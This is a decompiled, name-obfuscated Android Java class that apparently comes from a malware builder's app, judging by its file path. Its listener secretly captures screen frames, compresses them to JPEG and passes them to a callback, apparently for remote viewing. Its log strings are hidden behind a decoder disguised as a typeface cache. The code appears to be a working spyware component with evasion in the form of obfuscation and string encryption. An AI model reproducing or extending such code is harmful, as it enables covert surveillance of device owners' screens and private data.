package v.s;

import android.graphics.Bitmap;
import android.media.Image;
import android.media.ImageReader;
import app.mobilex.plus.services.ConfigTQWorker;
import app.mobilex.plus.util.TypefaceCache;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class drzny1wQFcvLKP implements ImageReader.OnImageAvailableListener {
    public final /* synthetic */ int dDIMxZXP1V8HdM;
    public final /* synthetic */ Object w9sT1Swbhx3hs;

    public /* synthetic */ drzny1wQFcvLKP(int i, Object obj) {
        this.dDIMxZXP1V8HdM = i;
        this.w9sT1Swbhx3hs = obj;
    }

    @Override // android.media.ImageReader.OnImageAvailableListener
    public final void onImageAvailable(ImageReader imageReader) {
        Bitmap bitmapCreateBitmap;
        switch (this.dDIMxZXP1V8HdM) {
            case 0:
                ConfigTQWorker configTQWorker = (ConfigTQWorker) this.w9sT1Swbhx3hs;
                byte[] bArr = ConfigTQWorker.ibVTtJUNfrGYbW;
                try {
                    Image imageAcquireLatestImage = imageReader.acquireLatestImage();
                    if (imageAcquireLatestImage != null) {
                        ByteBuffer buffer = imageAcquireLatestImage.getPlanes()[0].getBuffer();
                        byte[] bArr2 = new byte[buffer.remaining()];
                        buffer.get(bArr2);
                        ConfigTQWorker.ibVTtJUNfrGYbW = bArr2;
                        ConfigTQWorker.b1EoSIRjJHO5 = System.currentTimeMillis();
                        TypefaceCache.obtain("0013007E0054009300FF00FF00D100A600330062004E009500F500BB008800E7");
                        TypefaceCache.obtain("006300740042009300F500AC");
                        imageAcquireLatestImage.close();
                        configTQWorker.dDIMxZXP1V8HdM();
                        configTQWorker.stopSelf();
                        return;
                    }
                    return;
                } catch (Exception e) {
                    TypefaceCache.obtain("000A007B005A008000F500FF00D100A600330062004E009500F500FF00D700B500310079004900DD00B0");
                    e.getMessage();
                    return;
                }
            default:
                vatBtnIbOWqS8Z vatbtnibowqs8z = (vatBtnIbOWqS8Z) this.w9sT1Swbhx3hs;
                if (vatbtnibowqs8z.ibVTtJUNfrGYbW.get()) {
                    Image imageAcquireLatestImage2 = imageReader != null ? imageReader.acquireLatestImage() : null;
                    try {
                        if (imageAcquireLatestImage2 == null) {
                            return;
                        }
                        try {
                            long jNanoTime = System.nanoTime();
                            if (jNanoTime - vatbtnibowqs8z.Qrz92kRPw4GcghAc < vatbtnibowqs8z.nQilHWaqS401ZtR) {
                                imageAcquireLatestImage2.close();
                            } else {
                                vatbtnibowqs8z.Qrz92kRPw4GcghAc = jNanoTime;
                                Image.Plane plane = imageAcquireLatestImage2.getPlanes()[0];
                                ByteBuffer buffer2 = plane.getBuffer();
                                int rowStride = plane.getRowStride();
                                int pixelStride = plane.getPixelStride();
                                int width = imageAcquireLatestImage2.getWidth();
                                int height = imageAcquireLatestImage2.getHeight();
                                int i = width * pixelStride;
                                if (rowStride == i) {
                                    bitmapCreateBitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
                                    bitmapCreateBitmap.copyPixelsFromBuffer(buffer2);
                                } else {
                                    Bitmap bitmapCreateBitmap2 = Bitmap.createBitmap(((rowStride - i) / pixelStride) + width, height, Bitmap.Config.ARGB_8888);
                                    bitmapCreateBitmap2.copyPixelsFromBuffer(buffer2);
                                    bitmapCreateBitmap = Bitmap.createBitmap(bitmapCreateBitmap2, 0, 0, width, height);
                                    if (bitmapCreateBitmap != bitmapCreateBitmap2) {
                                        bitmapCreateBitmap2.recycle();
                                    }
                                }
                                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream((width * height) / 8);
                                bitmapCreateBitmap.compress(Bitmap.CompressFormat.JPEG, vatBtnIbOWqS8Z.EWUjsTERgdPbSw3NNlN, byteArrayOutputStream);
                                bitmapCreateBitmap.recycle();
                                byte[] byteArray = byteArrayOutputStream.toByteArray();
                                vatbtnibowqs8z.b1EoSIRjJHO5.set(byteArray);
                                vatbtnibowqs8z.pyu8ovAipBTLYAiKab++;
                                try {
                                    ubmqYDSfxvxS ubmqydsfxvxs = vatbtnibowqs8z.D5P1xCAyuvgF;
                                    if (ubmqydsfxvxs != null) {
                                        ubmqydsfxvxs.dDIMxZXP1V8HdM(byteArray, Integer.valueOf(vatbtnibowqs8z.gmNWMfvn6zlEj), Integer.valueOf(vatbtnibowqs8z.gIIiyi2ddlMDR0));
                                    }
                                } catch (Exception e2) {
                                    TypefaceCache.obtain("00050064005A008A00F500FF00D100A6002F007A0059008600F300B4009200A2003100640054009500AA00FF");
                                    e2.getMessage();
                                }
                            }
                            break;
                        } catch (Exception e3) {
                            TypefaceCache.obtain("00050064005A008A00F500FF00D700B500310079004900DD00B0");
                            e3.getMessage();
                        }
                        return;
                    } finally {
                        imageAcquireLatestImage2.close();
                    }
                }
                return;
        }
    }
}
